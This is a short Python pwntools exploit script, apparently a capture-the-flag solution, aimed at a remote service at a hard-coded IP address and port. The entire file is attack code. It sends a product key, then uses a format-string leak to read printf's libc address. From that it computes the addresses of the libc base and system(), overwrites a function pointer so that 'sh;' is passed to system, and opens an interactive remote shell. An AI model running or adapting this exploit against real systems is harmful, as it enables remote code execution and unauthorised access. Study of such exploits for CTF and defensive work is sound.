#!/usr/bin/python
from pwn import *

r = remote('175.119.158.133', 23232)
r.recvuntil('input product key:')
r.send('615066814080\n')

r.recvuntil('choice ')
r.send('1\n')
r.recvuntil('insert >>')
r.send('%13$s aaaaaaaaaaaaaaaaaa\x90\x07\x40\n')

r.recvuntil('choice ')
r.send('3aaaaaaa\x30\x20\x60\n')
r.recvuntil('0x400790\n')
printf = struct.unpack('<Q', r.recvn(6).ljust(8, '\x00'))[0]
libc_base = printf - 0x54ba0
system = libc_base + 0x443d0
print hex(printf)
print hex(libc_base)
print hex(system)

r.recvuntil('choice ')
r.send('2\n')
r.recvuntil('choice')
r.send('0\n')

r.recvuntil('choice ')
r.send('1\n')
r.recvuntil('insert >>')
r.send('sh;   aaaaaaaaaaaaaaaaaa' + struct.pack('<Q', system)[:6] + '\n')
r.recvuntil('choice ')
r.send('3aaaaaaa\x30\x20\x60\n')

r.interactive()
